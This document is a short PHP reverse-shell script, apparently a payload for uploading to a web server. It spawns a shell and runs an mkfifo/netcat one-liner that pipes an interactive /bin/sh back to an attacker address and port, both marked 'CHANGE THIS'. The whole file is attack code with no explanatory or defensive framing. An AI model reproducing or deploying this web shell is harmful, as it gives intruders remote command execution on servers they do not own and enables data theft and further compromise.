<?php
set_time_limit (0);
$ip = '10.10.10.10';  // CHANGE THIS
$port = 4444;      // CHANGE THIS

// Spawn shell process
$descriptorspec = array(
0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
2 => array("file", "/tmp/error-output.txt", "a")   // stderr is a pipe that the child will write to
);

$cwd = "/tmp";
$env = array('some_option' => 'aeiou');

$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    fwrite($pipes[0], 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    $return_value = proc_close($process);
    echo "command returned $return_value\n";
}
?>